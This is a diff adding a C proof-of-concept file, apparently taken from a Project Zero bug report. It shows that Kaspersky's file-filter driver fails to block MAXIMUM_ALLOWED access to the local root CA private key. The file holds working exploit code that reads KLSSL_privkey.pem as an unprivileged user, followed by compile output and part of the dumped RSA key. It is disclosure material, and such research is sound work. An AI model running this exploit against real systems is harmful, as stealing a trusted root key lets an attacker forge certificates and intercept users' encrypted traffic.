@@ -1,0 +1,67 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=989
+
+When Kaspersky generate a private key for the local root, they store the private key in %ProgramData%. Obviously this file cannot be shared, because it's the private key for a trusted local root certificate and users can use it to create certificates, sign files, create new roots, etc. If I look at the filesystem ACLs, I should have access, and was about to complain that they've done this incorrectly, but it doesn't work and it took me a while to figure out what they were doing.
+
+$ icacls KLSSL_privkey.pem
+KLSSL_privkey.pem BUILTIN\Administrators:(I)(F)
+                  BUILTIN\Users:(I)(RX) <-- All users should have read access
+                  NT AUTHORITY\SYSTEM:(I)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+$ cat KLSSL_privkey.pem
+cat: KLSSL_privkey.pem: Permission denied
+
+Single stepping through why this fails, I can see their filter driver will deny access from their PFLT_POST_OPERATION_CALLBACK after checking the Irpb. That sounds difficult to get right, and reverse engineering the filter driver, I can see they're setting Data->IoStatus.Status = STATUS_ACCESS_DENIED if the Irpb->Parameters (like DesiredAccess or whatever) don't match a hardcoded bitmask.
+
+But the blacklist is insufficient, they even missed MAXIMUM_ALLOWED (?!!!). This is trivial to exploit, any unprivileged user can now become a CA.
+*/
+
+#include <windows.h>
+#include <stdio.h>
+#include <io.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv)
+{
+    HANDLE File;
+    BYTE buf[2048] = {0};
+    DWORD count;
+
+    File = CreateFile("c:\\ProgramData\\Kaspersky Lab\\AVP17.0.0\\Data\\Cert\\KLSSL_privkey.pem",
+            MAXIMUM_ALLOWED,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL);
+    if (File != INVALID_HANDLE_VALUE) {
+        if (ReadFile(File, buf, sizeof(buf), &count, NULL) == TRUE) {
+            setmode(1, O_BINARY);
+            fwrite(buf, 1, count, stdout);
+        }
+        CloseHandle(File);
+        return 0;
+    }
+    return 1;
+}
+
+/*
+$ cl test.c
+Microsoft (R) C/C++ Optimizing Compiler Version 18.00.31101 for x86
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+test.c
+Microsoft (R) Incremental Linker Version 12.00.31101.0
+Copyright (C) Microsoft Corporation.  All rights reserved.
+
+/out:test.exe
+test.obj
+$ ./test.exe | openssl rsa -inform DER -text -noout
+Private-Key: (2048 bit)
+modulus:
+    00:b4:3f:57:21:e7:c3:45:e9:43:ec:b4:83:b4:81:
+    bb:d3:3b:9b:1b:da:07:55:68:e0:b1:75:38:b9:66:
+    0d:4c:e4:e7:f3:92:01:fb:33:bf:e6:34:e4:e8:db:
+    f1:7c:53:bc:95:2c:2d:08:8d:7c:8c:03:71:cd:07:
+*/
